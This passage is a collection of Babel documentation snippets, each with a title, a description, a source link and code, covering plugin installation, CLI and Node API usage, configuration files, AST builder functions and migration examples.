javascript\nCODE:\n```\nt.tupleTypeAnnotation(types);\n```\n\n----------------------------------------\n\nTITLE: Install babel-helper-evaluate-path\nDESCRIPTION: Installation command for the babel-helper-evaluate-path package.  It installs the package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-evaluate-path.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-helper-evaluate-path --save-dev\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Symbol Keyword\nDESCRIPTION: Creates a TypeScript `symbol` keyword node in the AST. Represents the `symbol` type in TypeScript. It doesn't take any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_206\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsSymbolKeyword();\n```\n\n----------------------------------------\n\nTITLE: Configuring with '^^' topic token\nDESCRIPTION: This JSON snippet demonstrates how to configure the @babel/plugin-syntax-pipeline-operator plugin in babel.config.json with the '^^' topic token.  The plugin is added to the 'plugins' array, along with an options object specifying the 'topicToken'.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-pipeline-operator.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [ \"@babel/plugin-syntax-pipeline-operator\", { \"topicToken\": \"^^\" } ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing the Babel Plugin\nDESCRIPTION: Installs the @babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining plugin as a dev dependency using npm. This plugin fixes a V8 bug related to spread parameters in optional chaining.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-v8-spread-parameters-in-optional-chaining.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-bugfix-v8-spread-parameters-in-optional-chaining\n```\n\n----------------------------------------\n\nTITLE: Migrating deprecated codeFrame to codeFrameColumns\nDESCRIPTION: Shows how to migrate from the deprecated `codeFrame` API to the new `codeFrameColumns` API using a `location` object.\nSOURCE: https://github.com/babel/website/blob/main/docs/code-frame.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nimport { codeFrameColumns } from \"@babel/code-frame\";\n\nconst rawLines = `class Foo {\\n  constructor() {\\n    console.log(\"hello\");\\n  }\\n}`;\nconst location = { start: { line: 2, column: 16 } };\n\nconst result = codeFrameColumns(rawLines, location, {\n  /* options */\n});\n\nconsole.log(result);\n```\n\n----------------------------------------\n\nTITLE: Usage via CLI Shell\nDESCRIPTION: Demonstrates how to use the Babel CLI to transform a JavaScript file (`script.js`) using the `@babel/plugin-transform-class-static-block` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-static-block.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-class-static-block script.js\n```\n\n----------------------------------------\n\nTITLE: Use plugin via Node API (JavaScript)\nDESCRIPTION: This JavaScript snippet shows how to use the `@babel/plugin-transform-property-mutators` plugin via the Babel Node API. It transforms the `code` string using the specified plugin and returns the transformed code. The `transformSync` method is used for synchronous transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-mutators.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-property-mutators\"],\n});\n```\n\n----------------------------------------\n\nTITLE: CallExpression AST (Babel 7)\nDESCRIPTION: Babel 7 AST for CallExpression, using `typeParameters`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_27\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"CallExpression\",\n  \"callee\": Identifier(\"fn\"),\n  \"arguments\": [],\n  \"typeParameters\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n    \"params\": [{\n      \"type\": \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeOperator Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTypeOperator` AST node using Babel's `t.tsTypeOperator` method. It requires a type annotation, and the `operator` property must be set within the AST Node.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_214\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeOperator(typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Renamed AST Node Handling\nDESCRIPTION: This code snippet illustrates how to update plugin code to handle renamed AST nodes, specifically `ExistentialTypeParam` to `ExistsTypeAnnotation` and `NumericLiteralTypeAnnotation` to `NumberLiteralTypeAnnotation`. It demonstrates how to modify the plugin's visitor methods and type checks to reflect the new node names.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_13\n\nLANGUAGE: diff\nCODE:\n```\n import * as t from \"@babel/types\";\n\n return {\n-  ExistentialTypeParam(path) {\n-    const parent = path.findParent((path) => path.isExistentialTypeParam());\n-    t.isExistentialTypeParam(parent);\n+  ExistsTypeAnnotation(path) {\n+    const parent = path.findParent((path) => path.isExistsTypeAnnotation());\n+    t.isExistsTypeAnnotation(parent);\n\n-    return t.existentialTypeParam();\n+    return t.existsTypeAnnotation();\n   },\n-  NumericLiteralTypeAnnotation(path) {\n-    const parent = path.findParent((path) => path.isNumericLiteralTypeAnnotation());\n-    t.isNumericLiteralTypeAnnotation(parent);\n+  NumberLiteralTypeAnnotation(path) {\n+    const parent = path.findParent((path) => path.isNumberLiteralTypeAnnotation());\n+    t.isNumberLiteralTypeAnnotation(parent);\n\n-    return t.numericLiteralTypeAnnotation();\n+    return t.numberLiteralTypeAnnotation();\n   }\n };\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via CLI\nDESCRIPTION: Executes the Babel CLI with the specified plugin to transform a JavaScript file. This command transforms the script.js file using the @babel/plugin-syntax-numeric-separator plugin, enabling parsing of numeric separators.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-numeric-separator.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-numeric-separator script.js\n```\n\n----------------------------------------\n\nTITLE: Installing a Stage Preset\nDESCRIPTION: Installs a stage preset (e.g., `babel-preset-stage-2`) as a development dependency using npm. Stage presets include features that are in various stages of the ECMAScript standardization process.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install --save-dev babel-preset-stage-2\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: This command demonstrates how to use the @babel/plugin-transform-template-literals plugin via the Babel CLI to transform a script.js file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-template-literals script.js\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Method Signature\nDESCRIPTION: Creates a TypeScript method signature node in the AST. Used within interfaces or type literals to define the signature of a method.  Requires the method's key and parameters, and accepts optional type parameters and type annotation.  The `computed` and `optional` properties are excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_188\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsMethodSignature(key, typeParameters, parameters, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Do Expressions in Babel 8\nDESCRIPTION: Shows how to use do expressions within Babel 8 to create block-scoped expressions. This can be useful in situations where a statement is needed but an expression is expected.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nvar a = do { if (true) { 'hi'; } };\n```\n\n----------------------------------------\n\nTITLE: Install babel-plugin-transform-minify-booleans\nDESCRIPTION: Installs the babel-plugin-transform-minify-booleans package as a development dependency using npm.\nRequires: npm or yarn. Input: npm install command. Output: Installation of the Babel plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-minify-booleans.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-minify-booleans --save-dev\n```\n\n----------------------------------------\n\nTITLE: Install via npm\nDESCRIPTION: Command to install the plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-modules-commonjs\n```\n\n----------------------------------------\n\nTITLE: ES5 React Component Creation\nDESCRIPTION: Illustrates creating a React component using the React.createClass method in ES5.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// The ES5 way\nvar Photo = React.createClass({\n  handleDoubleTap: function(e) { … },\n  render: function() { … },\n});\n```\n\n----------------------------------------\n\nTITLE: Compiled CommonJS Module\nDESCRIPTION: This JavaScript code shows the CommonJS output after compiling the previous ESM module. This is used to highlight the differences in how default exports are handled in Node.js versus other tools.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-04-29-7.14.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.default = two;\n\nfunction two() {\n  return 2;\n}\n```\n\n----------------------------------------\n\nTITLE: Install Plugin via NPM\nDESCRIPTION: This shell command installs the @babel/plugin-syntax-throw-expressions package as a development dependency using npm. This is required to use the plugin in a Babel project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-throw-expressions.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-throw-expressions\n```\n\n----------------------------------------\n\nTITLE: JavaScript with bugfixes disabled\nDESCRIPTION: Shows how Babel transforms JavaScript code with function parameters when targeting Edge 16, but with `bugfixes` option disabled. It demonstrates how the code is transformed to ES5-like parameters to avoid the bug.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = ({ a = 1 }, b = 2, ...args) => [a, b, args];\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = function foo(_ref, b) {\n let { a = 1 } = _ref;\n\n if (b === void 0) { b = 2; }\n\n for (\n   var _len = arguments.length,\n     args = new Array(_len > 2 ? _len - 2 : 0),\n     _key = 2;  _key < _len; _key++\n ) {\n   args[_key - 2] = arguments[_key];\n }\n\n return [a, b, args];\n};\n```\n\n----------------------------------------\n\nTITLE: Installing babel-helper-to-multiple-sequence-expressions with npm\nDESCRIPTION: This command installs the babel-helper-to-multiple-sequence-expressions package as a development dependency using npm. This is typically used for tools needed during development but not at runtime.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-to-multiple-sequence-expressions.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-helper-to-multiple-sequence-expressions --save-dev\n```\n\n----------------------------------------\n\nTITLE: Require Babel Polyfill\nDESCRIPTION: This code snippet demonstrates how to require the `@babel/polyfill` package in a JavaScript application. It should be placed at the top of the entry point to ensure that polyfills are loaded before any other code.  This approach is typically used in Node.js or environments where `require` is the module loading mechanism.\nSOURCE: https://github.com/babel/website/blob/main/docs/polyfill.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/polyfill\");\n```\n\n----------------------------------------\n\nTITLE: Plugin Installation via npm\nDESCRIPTION: This command shows how to install the @babel/plugin-transform-spread plugin using npm. It installs the plugin as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-spread\n```\n\n----------------------------------------\n\nTITLE: Property Literals Transformation Example (Input)\nDESCRIPTION: This JavaScript code snippet demonstrates the input code that the @babel/plugin-transform-property-literals plugin will transform. It contains object properties that use JavaScript keywords (const, var) as unquoted names. These will be converted to string literals.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-literals.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = {\n  // changed\n  const: function() {},\n  var: function() {},\n\n  // not changed\n  \"default\": 1,\n  [a]: 2,\n  foo: 1,\n};\n```\n\n----------------------------------------\n\nTITLE: Creating a TSDeclareMethod Node in JavaScript\nDESCRIPTION: This code creates a `TSDeclareMethod` AST node using `t.tsDeclareMethod`. It requires decorators, a key, type parameters, parameters, and a return type. This node represents a method declaration within a TypeScript class or interface.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_168\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsDeclareMethod(decorators, key, typeParameters, params, returnType);\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via Node API\nDESCRIPTION: Uses the @babel/core API to transform code with the @babel/plugin-syntax-export-default-from plugin.  The transformSync method is used to synchronously transform the provided code string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-export-default-from.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-export-default-from\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Running Babel Transformation from Shell\nDESCRIPTION: This shell command demonstrates how to run Babel to transform source code in the `src` directory and output the transformed code to the same `src` directory, overwriting the original files. This is commonly used in codemod workflows.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-12-07-the-state-of-babel.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nbabel src -d src\n```\n\n----------------------------------------\n\nTITLE: Pipeline Operator with Partial Application JavaScript\nDESCRIPTION: Illustrates how the partial application proposal can be used in conjunction with the pipeline operator to simplify code by avoiding arrow functions. This example shows a cleaner way to apply multiple transformations to a value.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet newScore = player.score\n  |> add(?, 7)\n  |> clamp(0, 100, ?);\n\n// Without this proposal:\nlet newScore = player.score\n  |> (_ => add(_, 7))\n  |> (_ => clamp(0, 100, _));\n```\n\n----------------------------------------\n\nTITLE: CLI Usage\nDESCRIPTION: This command shows how to use the @babel/plugin-transform-spread plugin via the Babel CLI.  It transforms `script.js` using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-spread script.js\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Current JavaScript example\nDESCRIPTION: This snippet shows standard JavaScript code for calculating a new score, used as a comparison for the F# and Smart pipeline examples.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet newScore = boundScore(\n  0,\n  100,\n  add(7, double(person.score))\n);\n\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration JSON\nDESCRIPTION: Example babel.config.json file showing how to configure Babel to use the @babel/plugin-proposal-function-bind plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-function-bind\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin within a babel.config.json file. This is the recommended way to use the plugin, as it centralizes Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-display-name.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-react-display-name\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Generator JSON Compatible Strings Option (JavaScript)\nDESCRIPTION: This snippet shows how to configure the `babel-generator` with the `jsonCompatibleStrings` option. When set to true, the generator will escape Unicode characters in strings to be JSON compatible.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"generatorOpts\": {\n    \"jsonCompatibleStrings\": true // defaults to false\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Class Expression (JavaScript)\nDESCRIPTION: Creates a `ClassExpression` AST node. This node represents a class expression, which defines a class without a name. Parameters include the identifier (`id`), the superclass (`superClass`), the class body (`body`), and decorators (`decorators`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_23\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classExpression(id, superClass, body, decorators);\n```\n\n----------------------------------------\n\nTITLE: Enabling Tokens in Babel Parser\nDESCRIPTION: This code snippet demonstrates how to enable the `tokens` option in the Babel parser. This is necessary if your Babel plugin depends on the token stream. Enabling this option can impact performance, so it should only be done if absolutely necessary.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default function() {\n  return {\n    manipulateOptions(opts, parserOpts) {\n      parserOpts.tokens = true;\n    },\n    ...\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Install Block-Scoped Functions Plugin (Shell)\nDESCRIPTION: This command installs the @babel/plugin-transform-block-scoped-functions plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoped-functions.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-block-scoped-functions\n```\n\n----------------------------------------\n\nTITLE: Using environmentVisitor with traverse.visitors.merge (JS)\nDESCRIPTION: This code demonstrates how to use `environmentVisitor` with `traverse.visitors.merge` within a Babel plugin's `Function` visitor.  It collects `AwaitExpression` nodes within an async function body, skipping `ArrowFunctionExpression` nodes.  The `environmentVisitor` ensures the correct `this` context is maintained during the traversal.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nmodule.exports = (api) => {\n  const { types: t, traverse } = api;\n  return {\n    name: \"collect-await\",\n    visitor: {\n      Function(path) {\n        if (path.node.async) {\n          const awaitExpressions = [];\n          // Get a list of related await expressions within the async function body\n          path.traverse(traverse.visitors.merge([\n            environmentVisitor,\n            {\n              AwaitExpression(path) {\n                awaitExpressions.push(path);\n              },\n              ArrowFunctionExpression(path) {\n                path.skip();\n              },\n            }\n          ]))\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Decorators Usage with Babel JavaScript\nDESCRIPTION: Shows how to enable decorators in Babel using the `optional` or `stage` options within the `transform` function. It demonstrates two equivalent methods for enabling the feature.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"babel\").transform(\"code\", {\n  optional: [\"es7.decorators\"]\n});\n// or\nrequire(\"babel\").transform(\"code\", { stage: 1 });\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareModuleExports AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareModuleExports` to create a declare module exports node in the AST for Flow type annotations. It takes a TypeAnnotation representing the type of the module's exports.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_39\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareModuleExports(typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Invalid Babel Configuration for Dynamic Import\nDESCRIPTION: This snippet shows an invalid Babel configuration. The `@babel/plugin-proposal-dynamic-import` plugin requires a module transform plugin (like `@babel/plugin-transform-modules-commonjs` or `@babel/plugin-transform-modules-amd`) to be used alongside it.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  plugins: [\n    \"@babel/plugin-proposal-dynamic-import\"\n  ]\n};\n\n```\n\n----------------------------------------\n\nTITLE: Running Babel using npm run (Shell)\nDESCRIPTION: This command executes the \"build\" script defined in the `package.json` file. It uses `npm run` to invoke the script, which in turn runs the Babel CLI to transpile the source code. This assumes a `build` script has been previously defined in `package.json`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_cli/usage.md#_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nnpm run build\n```\n\n----------------------------------------\n\nTITLE: transform-react-constant-elements: Avoid Reusing Mutable Props - JavaScript\nDESCRIPTION: This example shows that the `transform-react-constant-elements` plugin avoids hoisting elements with mutable props, such as `style`. This is because reusing elements with mutable props can lead to unexpected behavior and bugs, particularly when the props are modified.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n<div style={\n  { width: 100 }\n} />\n```\n\n----------------------------------------\n\nTITLE: Convert npm install to yarn add\nDESCRIPTION: This snippet shows how to convert the npm install command to its equivalent yarn add command. It is used to install the @babel/register package. No special dependencies are required.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_register/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @babel/register\n```\n\n----------------------------------------\n\nTITLE: Install Babel Sticky Regex Plugin\nDESCRIPTION: Installs the @babel/plugin-transform-sticky-regex plugin as a development dependency using npm. This is a prerequisite for using the plugin in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-sticky-regex.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-sticky-regex\n```\n\n----------------------------------------\n\nTITLE: Class Static Blocks Support in Babel\nDESCRIPTION: This snippet demonstrates the use of class static blocks, a proposal that allows initializing static properties within a class.  The `static` block is executed when the class is loaded. No specific dependencies are needed beyond Babel's support for the proposal.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass A {\n  static { initialize(A); }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Class Body (JavaScript)\nDESCRIPTION: Creates a `ClassBody` AST node.  This node represents the body of a class, containing an array of class members, such as methods and properties. The `body` parameter is an array of `ClassMethod`, `ClassPrivateMethod`, `ClassProperty`, `ClassPrivateProperty`, `ClassAccessorProperty`, `TSDeclareMethod`, `TSIndexSignature`, or `StaticBlock` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_21\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classBody(body);\n```\n\n----------------------------------------\n\nTITLE: Using a custom preset in an inline script\nDESCRIPTION: This snippet demonstrates using a custom Babel preset in an inline script tag, enabled via the data-presets attribute. This example requires a preset named 'env-plus' to be registered.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_13\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/babel\" data-presets=\"env-plus\">\n\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-bigint via Node API\nDESCRIPTION: Demonstrates how to use the @babel/plugin-syntax-bigint plugin via the Babel Node API. The transformSync function is used to transform code with the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-bigint.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-bigint\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Plugin Configuration (babel.config.json)\nDESCRIPTION: This example demonstrates how to configure the plugin within a babel.config.json file. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-comments.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-flow-comments\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Object Destructuring with Rest (JavaScript)\nDESCRIPTION: This JavaScript code uses object destructuring with a rest pattern. The `objectRestNoSymbols` assumption tells Babel that destructured objects don't have symbol keys, or that it's not a problem if symbol keys are not copied.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet { name, ...attrs } = obj;\n```\n\n----------------------------------------\n\nTITLE: Constant Elements Usage with Babel JavaScript\nDESCRIPTION: Shows how to enable the `constantElements` optimization for React in Babel using the `optional` option within the `transform` function.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"babel\").transform(\"code\", {\n  optional: [\"optimisation.react.constantElements\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Running Babel CLI directly (Shell)\nDESCRIPTION: This command directly invokes the Babel CLI executable located in the `node_modules/.bin` directory.  It transpiles files from the `src` directory to the `lib` directory.  This approach allows running Babel without relying on npm scripts but requires knowing the exact path to the executable.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_cli/usage.md#_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\n./node_modules/.bin/babel src -d lib\n```\n\n----------------------------------------\n\nTITLE: Creating Class Private Method (JavaScript)\nDESCRIPTION: Creates a `ClassPrivateMethod` AST node. This node represents a private method within a class. Parameters include the method's kind (`kind`), key (`key`), parameters (`params`), body (`body`), and static flag (`static`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_26\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.classPrivateMethod(kind, key, params, body, static);\n```\n\n----------------------------------------\n\nTITLE: Creating an EmptyStatement AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.emptyStatement` to create an empty statement node in the AST. It takes no arguments and represents a semicolon (`;`) in JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_49\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.emptyStatement();\n```\n\n----------------------------------------\n\nTITLE: Installing karma-babel-preprocessor and @babel/core with npm\nDESCRIPTION: This command installs the karma-babel-preprocessor and @babel/core packages as development dependencies using npm. This setup is useful for projects that use Babel for transpilation during testing with Karma.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/karma/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev karma-babel-preprocessor @babel/core\n```\n\n----------------------------------------\n\nTITLE: Valid and Invalid Decorator Syntax in JavaScript\nDESCRIPTION: These JavaScript code snippets illustrate the valid and invalid syntax for decorators on exported classes, as per the updated Decorators proposal.  The key change is that decorators can be placed either before or after the `export` keyword, but not in both locations simultaneously. Demonstrates how to properly define decorators for exported JavaScript classes.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-02-20-7.21.0.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// valid\n@dec\nexport class A {}\n\n// valid\nexport @dec class B {}\n\n// invalid\n@dec\nexport @dec class C {}\n```\n\n----------------------------------------\n\nTITLE: Print effective Babel configs on *nix or WSL\nDESCRIPTION: This bash shell snippet demonstrates how to print effective configs on a given input path on *nix or WSL environments using the BABEL_SHOW_CONFIG_FOR environment variable. The environment variable specifies the file for which Babel should print the effective configurations. The npm start command initiates the Babel processing.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n# *nix or WSL\nBABEL_SHOW_CONFIG_FOR=./src/myComponent.jsx npm start\n```\n\n----------------------------------------\n\nTITLE: Creating a Variance with Babel\nDESCRIPTION: Creates a `Variance` AST node using the `t.variance` method. This node represents variance in Flow type annotations, where `kind` specifies the variance type (`\"minus\"` or `\"plus\"`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_248\n\nLANGUAGE: javascript\nCODE:\n```\nt.variance(kind);\n```\n\n----------------------------------------\n\nTITLE: Installing Babel 7 Dependencies\nDESCRIPTION: This command installs gulp-babel and @babel/core as development dependencies using npm. This is used for transpiling JavaScript code using Babel within a Gulp build process. The command should be executed in the project's root directory where the package.json file is located.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/gulp/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev gulp-babel @babel/core\n```\n\n----------------------------------------\n\nTITLE: Parse Import Reflections in JavaScript\nDESCRIPTION: This code snippet demonstrates the import reflection syntax, which allows importing a module with a specified name (foo) from a given file (./foo.wasm). The plugin only enables parsing and does not transform this syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-reflection.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport module foo from \"./foo.wasm\";\n```\n\n----------------------------------------\n\nTITLE: Install Plugin via npm\nDESCRIPTION: Command to install the `@babel/plugin-transform-class-properties` plugin as a development dependency using npm. This plugin is required for transforming class properties syntax in JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-class-properties\n```\n\n----------------------------------------\n\nTITLE: Input JavaScript with import defer\nDESCRIPTION: This is the input JavaScript code that utilizes the `import defer` syntax. The plugin will transform this code into CommonJS-compatible code with deferred loading.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-defer.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport defer * as lib from \"lib\";\n\nlater(() => {\n  console.log(lib.value);\n});\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI - Shell\nDESCRIPTION: This command demonstrates how to use the plugin via the Babel CLI. It specifies the plugin to use when transforming the 'script.js' 